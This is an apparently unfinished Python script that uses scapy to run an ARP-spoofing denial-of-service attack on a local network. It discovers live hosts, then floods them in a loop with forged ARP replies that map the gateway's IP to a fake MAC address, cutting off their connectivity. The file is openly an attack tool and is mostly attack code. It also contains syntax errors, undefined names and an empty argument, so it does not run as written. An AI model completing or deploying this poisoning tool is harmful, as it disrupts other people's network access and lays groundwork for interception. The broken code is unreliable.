#!/usr/bin/env python3

from scapy.all import *
import ipaddress
from time import sleep
import threading
from os import _exit
from sys import exit
import sqlite3

conf.verb = 0


def thread_runner(func, iterable):
    threads = set()
    for item in iterable:
        thread = threading.Thread(
            target=func,
            args=(item,),
            name='{}-{}'.format(func.__name__, item)
        )
        threads.add(thread)
        thread.start()

    for thread in threads:
        thread.join()


class IPAddress:
    arp_timeout = 15

    class AddressResolutionFailedError(RuntimeError):
        pass

    def __init__(self, ip):
        self.ip = ipaddress.IPv4Address(ip)
        self.mac = None
        self.vendor = None
        self.poisoned = False
        self.active = None

    def resolve_mac(self, bcast_if_fail=True):
        resp = srp1(
            Ether()/ARP(pdst=self.ip),
            timeout=arp_timeout
        )
        if resp is None:
            if bcast_if_fail:
                self.mac = 'ff:ff:ff:ff:ff:ff'
            else:
                raise AddressResolutionFailed(
                    "failed to resolve {}".format(self.ip)
                )
        else:
            self.mac = resp.hwsrc

    def resolve_vendor(self):
        if self.mac is None:
            self.resolve_mac()
        if self.mac == 'ff:ff:ff:ff:ff:ff':
            self.vendor =  ''
            return

        db = sqlite3.connect('oui.db')
        vendor = db.execute(
            'select vendor from macvendors where mac=?',
            (self.mac.replace(':', '')[:6].upper(),)
        ).fetchone()[0].strip()
        self.vendor = vendor if vendor is not None else ''

    def check_live(self):
        # TODO?: check if multiple replies
        if self.mac is None:
            self.resolve_mac()
        reply = srp1(
            Ether(dst=self.mac) / ARP(pdst=self.ip),
            timeout=arp_timeout
        )
        self.active = reply is not None

    # TODO
    def check_poison(self):
        # TODO: assert promisc mode
        raise NotImplementedError

class IPMultiple:
    def __init__(self, addrs):
        self.addrs = set(map(IPAddress, addrs))
        self.active_addrs = None
        self.active = None

    def resolve_mac(self):
        thread_runner(
            func=IPAddress.resolve_mac,
            iterable=self.addrs,
        )

    def resolve_vendor(self):
        thread_runner(
            func=IPAddress.resolve_vendor,
            iterable=self.addrs
        )

    def check_live(self):
        thread_runner(
            func=IPAddress.check_live,
            iterable=self.addrs
        )
        self.active_addrs = set(filter(lambda addr: addr.active, self.addrs))
        self.active = bool(self.active_addrs)


class IPNetwork(IPMultiple):
    def __init__(self, network, _except=None):
        self.network = ipaddress.IPv4Network(network)
        super().__init__(self.network.hosts())

        if _except is not None:
            if isinstance(_except, (tuple, list, set)):
                self._except = set(map(IPAddress, _except))
            else:
                self._except = {IPAddress(_except)}
        else:
            self._except = None
        self.addrs -= self._except


class Denier:
    interval = 1
    restore_count = 1000
    spoof_mac = 'de:ad:be:ef:13:37'

    class TargetInactiveException(ValueError):
        pass

    def __init__(self, target, gateway, iface):
        # TODO: get default iface as backup, else use all
        # TODO: get gateway automatically
        # TODO: assert target(s) on local subnet
        conf.iface = iface
        self.gateway = IPAddress(gateway)
        self.gateway.resolve_mac(bcast_if_fail=False)

        if '/' in target:
            self.target_type = 'network'
            self.target = IPNetwork(target)
        elif isinstance(target, (tuple, list, set)):
            self.target_type = 'multiple'
            self.target = IPMultiple(target)
        else:
            self.target_type = 'single'
            self.target = IPMultiple([target])

    def find_active(self):
        self.target.check_live()
        if not self.active:
            try:
                if self.target_type == 'single':
                    err = 'Target inactive'
                elif self.target_type == 'multiple':
                    err = 'All targets inactive'
                elif self.target_type == 'network':
                    err = 'All hosts on target network inactive'
                else:
                    raise ValueError(
                        "invalid target_type: must be one of "
                        "{'single', 'multiple', 'network'}"
                    )
            except ValueError as err:
                raise TargetInactiveException(err) from err
            else:
                raise TargetInactiveException(err)

    def restore(self):
        def restore_runner(self, addr):
            if self.gateway.mac is None:
                self.gateway.resolve_mac(bcast_if_fail=False)
            if addr.mac is None:
                addr.resolve_mac()
            sendp(
                (Ether(src=self.gateway.mac, dst=addr.mac)
                 / ARP(op='is-at',
                       hwsrc=self.gateway.mac, hwdst=addr.mac,
                       psrc=self.gateway.ip, pdst=addr.ip))
                count=restore_count,
                inter=interval
            )

        thread_runner(
            func=self.restore_runner,
            iterable=filter(lambda addr: addr.poisoned, self.target.active_addrs)
        )

    def poison(self):
        def poison_runner(self, addr):
            if addr.mac is None:
                addr.resolve_mac()
            sendp(
                (Ether(src=spoof_mac, dst=addr.mac)
                 / ARP(op='is-at'
                       hwsrc=spoof_mac, hwdst=addr.mac,
                       psrc=self.gateway.ip, pdst=addr.ip))
                inter=interval,
                loop=True
            )

        thread_runner(
            func=self.poison_runner,
            iterable=
        )
